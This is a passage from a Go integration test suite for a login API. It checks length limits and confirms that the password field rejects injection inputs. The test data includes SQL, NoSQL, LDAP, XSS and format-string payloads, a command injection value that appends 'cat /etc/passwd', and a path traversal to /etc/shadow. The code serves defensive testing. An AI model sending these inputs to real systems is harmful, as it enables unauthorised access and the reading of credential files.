			expectedStatus:  http.StatusUnauthorized,
			expectedMessage: "Invalid email/barcode or password",
			description:     "Repeated pattern for algorithmic complexity",
		},
		{
			name:            "Maximum Valid Length Test",
			loginField:      strings.Repeat("a", 79) + "@test.com", // Just under 80 char limit
			password:        fixtures.TestStudent.Password,
			expectedStatus:  http.StatusUnauthorized,
			expectedMessage: "Invalid email/barcode or password",
			description:     "Maximum length that passes validation",
		},
		{
			name:            "Boundary Test at Validation Limit",
			loginField:      strings.Repeat("A", 80), // Exactly at barcode limit
			password:        fixtures.TestStudent.Password,
			expectedStatus:  http.StatusUnauthorized,
			expectedMessage: "Invalid email/barcode or password",
			description:     "Boundary testing at validation limits",
		},
	}

	for _, tc := range testCases {
		s.T().Run(tc.name, func(t *testing.T) {
			resp := s.HTTP.Login(t, tc.loginField, tc.password)
			resp.AssertStatus(tc.expectedStatus)
			if tc.expectedMessage != "" {
				resp.AssertContainsMessage(tc.expectedMessage)
			}
		})
	}
}

// Test for password field injections specifically
func (s *AuthIntegrationSuite) TestAuth_PasswordFieldInjections() {
	user := builders.NewUserBuilder().
		WithEmail(fixtures.TestStudent.Email).
		WithBarcode(fixtures.TestStudent.Barcode).
		WithPassword(fixtures.TestStudent.Password).
		Build()
	s.DB.SeedUser(s.T(), user)

	testCases := []struct {
		name            string
		password        string
		expectedStatus  int
		expectedMessage string
	}{
		{
			name:            "SQL Injection in Password",
			password:        "' OR '1'='1",
			expectedStatus:  http.StatusUnauthorized,
			expectedMessage: "Invalid email/barcode or password",
		},
		{
			name:            "NoSQL Injection in Password",
			password:        "{\"$ne\": null}",
			expectedStatus:  http.StatusUnauthorized,
			expectedMessage: "Invalid email/barcode or password",
		},
		{
			name:            "XSS in Password",
			password:        "<script>alert('XSS')</script>",
			expectedStatus:  http.StatusUnauthorized,
			expectedMessage: "Invalid email/barcode or password",
		},
		{
			name:            "Command Injection in Password",
			password:        "password; cat /etc/passwd",
			expectedStatus:  http.StatusUnauthorized,
			expectedMessage: "Invalid email/barcode or password",
		},
		{
			name:            "LDAP Injection in Password",
			password:        "*)(uid=*",
			expectedStatus:  http.StatusUnauthorized,
			expectedMessage: "Invalid email/barcode or password",
		},
		{
			name:            "Path Traversal in Password",
			password:        "../../../etc/shadow",
			expectedStatus:  http.StatusUnauthorized,
			expectedMessage: "Invalid email/barcode or password",
		},
		{
			name:            "Null Byte in Password",
			password:        "password\x00admin",
			expectedStatus:  http.StatusUnauthorized,
			expectedMessage: "Invalid email/barcode or password",
		},
		{
			name:            "Unicode in Password",
			password:        "pàsswörd",
			expectedStatus:  http.StatusUnauthorized,
			expectedMessage: "Invalid email/barcode or password",
		},
		{
			name:            "Format String in Password",
			password:        "%s%s%s%s%s",
			expectedStatus:  http.StatusUnauthorized,
			expectedMessage: "Invalid email/barcode or password",
		},
		{
			name:            "Very Long Password",
			password:        strings.Repeat("A", 10000),
			expectedStatus:  http.StatusBadRequest,
			expectedMessage: "body must not be larger than 4 KB",
		},

		{
			name:            "Long Password Under Body Limit",
			password:        strings.Repeat("A", 500), // Under 4KB total
			expectedStatus:  http.StatusBadRequest,
			expectedMessage: "Password the length must be no more than 100",
		},
	}

	for _, tc := range testCases {
		s.T().Run(tc.name, func(t *testing.T) {
			resp := s.HTTP.Login(t, user.Email(), tc.password)
			resp.AssertStatus(tc.expectedStatus)
			if tc.expectedMessage != "" {
				resp.AssertContainsMessage(tc.expectedMessage)
			}
		})
	}
}
